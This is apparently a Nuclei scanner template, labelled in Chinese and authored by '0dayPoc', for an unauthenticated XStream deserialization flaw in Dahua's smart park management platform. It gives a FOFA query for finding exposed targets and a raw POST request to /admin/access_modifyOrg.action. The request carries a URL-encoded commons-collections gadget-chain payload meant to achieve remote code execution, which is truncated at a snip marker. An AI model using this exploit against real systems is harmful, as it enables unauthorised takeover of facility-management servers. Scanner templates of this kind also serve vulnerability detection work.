id: dahua-smartpark-access_modifyorg-deserialization

info:
  name: 大华智慧园区综合管理平台access_modifyOrg.action接口反序列化漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="DSS-help download"
          /admin/access_modifyOrg.action接口未正确验证和过滤输入参数，通过xstream组件(版本1.4.7)处理未授权的xmlInfo参数时触发反序列化漏洞，攻击者可构造恶意数据包实现远程代码执行
  tags: 大华智慧园区综合管理平台

http:
- raw:
  - |
    POST /admin/access_modifyOrg.action HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
    Content-Type: application/x-www-form-urlencoded
    Connection: close

    xmlInfo=%3c%6d%61%70%3e%3c%65%6e%74%72%79%3e%3c%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%63%6f%6c%6c%65%63%74%69%6f%6e%73%2e%6b%65%79%76%61%6c%75%65%2e%54%69%65%64%4d%61%70%45%6e%74%72%79%3e%3c%6d%61%70%20%63%6c%61%73%73%3d%22%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%63%6f%6c%6c%65%63%74%69%6f%6e%73%2e%6d%61%70%2e%4c%61%7a%79%4d%61%70%22%20%73%65%72%69%61%6c%69%7a%61%74%69%6f%6e%3d%22%63%75%73%74%6f%6d%22%3e%3c%75%6e%73%65%72%69%61%6c%69%7a%61%62%6c%65%2d%70%61%72%65%6e%74%73%2f%3e%3c%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%63%6f%6c%6c%65%63%74%69%6f%6e%73%2e%6d%61%70%2e%4c%61%7a%79%4d%61%70%3e%3c%64%65%66%61%75%6c%74%3e%3c%66%61%63%74%6f%72%79%20%63%6c%61%73%73%3d%22%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%63%6f%6c%6c%65%63%74%69%6f%6e%73%2e%66%75%6e%63%74%6f%72%73%2e%49%6e%76%6f%6b%65%72%54%72%61%6e%73%[SNIP]
